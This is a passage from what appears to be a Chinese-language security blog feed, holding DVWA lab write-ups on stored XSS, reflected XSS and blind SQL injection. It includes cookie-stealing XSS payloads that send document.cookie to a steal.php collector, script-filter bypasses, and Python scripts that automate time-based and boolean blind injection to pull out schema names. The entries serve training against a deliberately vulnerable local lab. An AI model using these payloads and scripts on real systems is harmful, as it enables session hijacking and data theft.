class="attr">onerror</span>=<span class="string">(alert(‘xss’))</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">'var url="http://127.0.0.1/demo/xss(reflected)/steal.php";var postStr="data="+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest)&#123;ajax=new XMLHttpRequest();&#125;else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject)&#123;ajax=new Act&amp;#x69;veXObject("M&amp;#x69;crosoft.XMLHTTP");&#125;else&#123;ajax=null;&#125;ajax.open("POST", url, true);ajax.setRequestHeader("Content-Type", "appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded");ajax.send(postStr);'</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将ajax代码执行，将cookie值POST到steal.php</p><p>但在输入之前，我们应该先改一下数据列name的长度，之前设定长度为100，但是我们输入的明显超过了100,在mysql命令行输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table guestbook modify name varchar(500);</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到cookie值 </p>]]></content>
    
    <summary type="html">
    
      dvwa-xss
    
    </summary>
    
      <category term="dvwa-xss" scheme="https://Foxgrin.github.io/categories/dvwa-xss/"/>
    
    
      <category term="xss" scheme="https://Foxgrin.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-xss(reflected)</title>
    <link href="https://Foxgrin.github.io//posts/52787/"/>
    <id>https://Foxgrin.github.io//posts/52787/</id>
    <published>2018-07-11T11:42:00.000Z</published>
    <updated>2018-07-11T13:35:48.318Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的反射型xss关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;low&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>当我们GET一个name值以后，服务器毫无过滤的通过echo输出我们GET的name值，而如果我们输入的是一串代码，则这串代码通过echo就会被执行，这就是反射型的xss漏洞，我们可以通过GET方式输入一串js代码构造一个注入js代码的网页，当受害者访问这个url时，js代码将会自动实现，从而达到恶意攻击目的</p><p>比如我们输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('xss')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>于是我们可以利用这个xss漏洞获取服务器的cookie值，然后将cookie值存入数据库</p><p>先创建一个存放cookie的数据库</p><p>在mysql命令行输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">create database dvwacookie;</span><br><span class="line"></span><br><span class="line">use  dvwacookie;</span><br><span class="line"></span><br><span class="line">create table low</span><br><span class="line"></span><br><span class="line">(</span><br><span class="line"></span><br><span class="line">id int primary key,</span><br><span class="line"></span><br><span class="line">cookie varchar(100) </span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>然后在编写一个cookie.js的脚本 </p><p><img src="/img/dvwa-xss-reflected/2.png" alt=""></p><p>这个脚本作用是创建隐藏表单，表单提交到steal.php，提交的内容是cookie值</p><p>接下来编写steal.php，自然就是将提交cookie值写入数据库里了</p><p>steal.php代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$con=mysql_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line">mysql_select_db(&apos;dvwacookie&apos;,$con);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;data&apos;]))&#123;</span><br><span class="line">$sql=&quot;INSERT INTO low(cookie) VALUES (&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;)&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后回到存在xss漏洞的网页，通过GET传入name值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">cookie.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>查看数据库</p><p><img src="/img/dvwa-xss-reflected/4.png" alt=""></p><p>成功获得cookie值 </p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123;</span><br><span class="line">$name=str_replace(&apos;&lt;script&gt;&apos;,&apos;&apos;,$_GET[&apos;name&apos;]);</span><br><span class="line">echo &apos;&lt;pre&gt;Hello &apos; . $name . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>源代码利用了str_replace函数对script标签进行了过滤</p><p>不过没关系，因为函数只执行了一次，所以用双写的方法就可以很轻松的解决</p><p>输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript&gt;alert('xss')&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>之后跟low关卡一样，输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript src=cookie.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>获得cookie值 </p><p><img src="/img/dvwa-xss-reflected/6.png" alt=""></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123;</span><br><span class="line">$name=preg_replace(&apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;,&apos;&apos;,$_GET[&apos;name&apos;]);</span><br><span class="line">echo &apos;&lt;pre&gt;Hello &apos; . $name . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关利用了一个正则匹配过滤函数，i表示大小写，也就是以&lt;开头，以t结尾的字符串，只要中间按顺序包含&lt;script，则会立刻被过滤掉，之前双写绕过过滤的方法在这里行不通</p><p>绕过方法是采用触发onerror事件来执行javascript代码</p><p>onerror事件会在文档或者图像加载过程中发生错误时触发</p><p>例如，我们输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(“xss”)</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然，加载图片时发现不存在这个图片发生错误所以触发了onerror事件，然后执行了alert(“xss”)代码 </p><p>那么我们再考虑怎么像之前两关一样获得cookie值</p><p>之前是通过script标签的src属性引用外部的cookie.js文件，将cookie值以POST形式传入steal.php，再将POST的cookie值写入数据库</p><p>但是很明显这关对script标签做了正则过滤，只要我们输入含有这几个字符，都会被过滤掉，所以这里可以用location.href跳转链接到steal.php，将cookie值写入数据库，所以这里只能用GET方式将cookie值传入steal.php</p><p>于是输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(location.href</span>=<span class="string">”http://127.0.0.1/demo/xss(reflected)/steal.php?data</span>=<span class="string">”+document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是结果却是</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>为什么呢</p><p>仔细检查发现我们输入里面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">SrC</span>=<span class="string">#</span> <span class="attr">oneRror</span>=<span class="string">(locatIon.href</span>=<span class="string">”httP://127.0.0.1/demo/xss(reflected)/steal.php?data</span>=<span class="string">”+document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>大写字母构成了&lt;script，所以被过滤掉了</p><p>所以我们可以采用先获得cookie值，然后将cookie值传入steal.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(alert(document.cookie))</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在将这个cookie值传入steal.php</p><p>还有种方法是对某个关键过滤字符进行html编码，但是我亲测不行，不知道什么原因，还望大神指点原因</p>]]></content>
    
    <summary type="html">
    
      dvwa-xss
    
    </summary>
    
      <category term="dvwa-xss" scheme="https://Foxgrin.github.io/categories/dvwa-xss/"/>
    
    
      <category term="xss" scheme="https://Foxgrin.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-sql(blind)</title>
    <link href="https://Foxgrin.github.io//posts/55409/"/>
    <id>https://Foxgrin.github.io//posts/55409/</id>
    <published>2018-07-11T07:39:00.000Z</published>
    <updated>2018-07-11T10:36:59.664Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的sql盲注关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$id=$_POST[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT first_name , last_name FROM users WHERE user_id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br><span class="line">if($row)&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>所谓的盲注，就是既没有报错信息，查询结果也始终如一甚至没有查询结果，也就是我们不知道会得到什么结果</p><p>我们就不能像之前一样自由选择注入方法，没有报错信息，也就是说报错注入不能用</p><p>没有查询结果，也就是说联合注入不能用</p><p>剩下的也就是盲注</p><p>盲注又可以分为基于时间的盲注和布尔型的盲注</p><p>从源代码来看，这关没有报错信息，查询结果为空和不为空返回的信息是不同的，我们就可以利用返回信息来判断有无返回结果</p><p>我们先输入1，发现有返回结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再输入1’，发现没有返回结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入1’#，发现有返回结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>说明id被单引号包裹，然后1是有查询结果的，然后我们就可以通用 1’ and 后面的语句进行盲注</p><p>and 后面的语句如果为真，则有返回结果，and 后面语句为假，则没有返回结果，我们可以在mysql命令行里先试着模拟注入语句</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>把and后面的语句修改为注入的逻辑语句，这就是布尔型的盲注，举个例子，我们可以用布尔型盲注判断数据库名字的长度</p><p>输入1’ and length(database())=4#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>而另一种基于时间的盲注，则是通过if(判断语句,1,sleep(5))来进行注入，如果判断语句为真，则不会sleep，为假则sleep 5秒</p><p>但是盲注的缺点就是一条一条试太麻烦了，这时候脚本的作用就体现出来了</p><p>我们先通过基于时间的盲注获取数据库名的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里r.elapsed.total_seconds()函数的作用是返回服务器接受请求到相应之间的时间，如果我们的判断语句length(database())=i 结果为真，则就不会sleep 5秒，t自然就小于5，就得到了数据库的长度</p><p>有了数据库名的长度，就可以获取数据库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>先获取数据库名长度的作用就是用来一位一位的截取数据库名的字符进行判断，如果等于一个ascii值则t&lt;5，这样一位一位的得到数据库名的字符</p><p>同样的方法获取数据表的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>获取数据表名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is:'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">3</span>):</span><br><span class="line">            table_name=table_name+chr(j)</span><br><span class="line">            print(<span class="string">'The name of table is:'</span>,table_name)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                table_name=table_name+<span class="string">','</span></span><br></pre></td></tr></table></figure><p>获取users表下数据列总长度：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        column_length=i</span><br><span class="line">        print(column_length)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里用了布尔型的盲注，由于数据列总长度可能较长，所以变量i的区间是通过反复尝试出来的</p><p>获取数据列名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            column_name=column_name+chr(j)</span><br><span class="line">            print(<span class="string">"The name of column is:"</span>,column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                column_name=column_name+<span class="string">','</span></span><br></pre></td></tr></table></figure><p>总结：大部分sql注入都是得不到想要的结果，也没有报错信息的，所以大部分情况下我们都要进行盲注，而盲注就强烈推荐使用脚本，可以非常好的节约时间和精力</p><p>下面贴上本关完整的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://127.0.0.1/demo/sqli(blind)-low.php'</span></span><br><span class="line">database_length=<span class="number">0</span></span><br><span class="line">table_length=<span class="number">0</span></span><br><span class="line">column_length=<span class="number">0</span></span><br><span class="line">database=<span class="string">''</span></span><br><span class="line">table_name=<span class="string">''</span></span><br><span class="line">column_name=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库长度:4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名:dvwa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and 